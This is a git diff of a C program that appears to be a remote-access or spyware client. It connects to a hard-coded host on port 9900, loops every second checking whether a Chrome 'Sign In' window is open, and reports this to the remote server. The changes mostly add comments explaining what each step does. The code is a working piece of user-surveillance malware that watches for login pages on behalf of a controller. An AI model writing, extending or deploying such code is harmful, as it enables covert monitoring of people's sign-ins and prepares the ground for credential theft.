@@ -74,10 +74,10 @@ int main()
 
 connect:
 
-    ///____________DNS + PORT___(These are hard coded for now
+    ///____________DNS + PORT___(These are hard coded for now)
     addr.sin_port = htons(9900);
         //-------Resolve DNS----
-            he = gethostbyname("192.168.0.15");
+            he = gethostbyname("192.168.0.15"); //
 if (!he)
   { puts("[i]Host could not be resolved..");
     return 0; //try again
@@ -85,8 +85,8 @@ if (!he)
   addr_list = (struct in_addr **)he->h_addr_list;
 
   for(i = 0; addr_list[i] != NULL; i++) { //cycle thru possible hosts
-         printf("[i]Host Found:%s ", inet_ntoa(*addr_list[i]));
-         //addr.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");
+         printf("[i]Host Found:%s", inet_ntoa(*addr_list[i]));
+        // addr.sin_addr.S_un.S_addr = inet_addr("192.168.0.15");
         addr.sin_addr.S_un.S_addr = inet_addr(inet_ntoa(*addr_list[i])); //SET OUR FUCKING IP TO RESOLVED DNS !
          break;
     }
@@ -115,11 +115,11 @@ printf("Fail connect..");
 //Ping loop .. very confusing at first glance , we always want to ping the server every second , so our commands are sent inside the ping loop!
 for(;;){
       do{
-       HWND hwnd = FindWindow( NULL, TEXT("Sign In - Google Chrome") );
+       HWND hwnd = FindWindow( NULL, TEXT("Sign In - Google Chrome") ); //Set up a HWND to check if a certain window is open as per its title
 
-      if(hwnd!=NULL) {
-            send(sock,windowbuffer,sizeof(windowbuffer),0);
-             printf("hotmail open");}
+      if(hwnd!=NULL) { //The window is open
+            send(sock,windowbuffer,sizeof(windowbuffer),0); //Tell the server!
+             printf("hotmail open");} //Verbosity for debugging
 
       Sleep(1000); // NO SPAM!
       }
